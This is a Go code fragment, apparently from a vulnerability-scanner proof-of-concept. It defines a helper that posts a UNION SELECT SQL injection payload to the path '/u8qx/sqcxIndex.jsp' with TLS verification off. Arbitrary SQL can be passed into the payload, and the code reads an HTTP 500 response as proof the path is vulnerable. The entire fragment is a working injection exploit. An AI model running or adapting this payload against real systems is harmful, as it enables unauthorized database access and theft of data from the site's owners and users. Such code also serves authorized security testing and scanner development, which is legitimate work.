	setSqlPayload_JMFVGfyO := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		rawPayload := fmt.Sprintf("11=11&key=2%%25')+union+select+(%s),111*111--+", url.QueryEscape(sql))

		url := "/u8qx/sqcxIndex.jsp"

		defineHeader := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		resp, err = setPostRequest(hostInfo, url, rawPayload, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 500 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/u8qx/sqcxIndex.jsp"

		return resp, vulurl, nil
	}

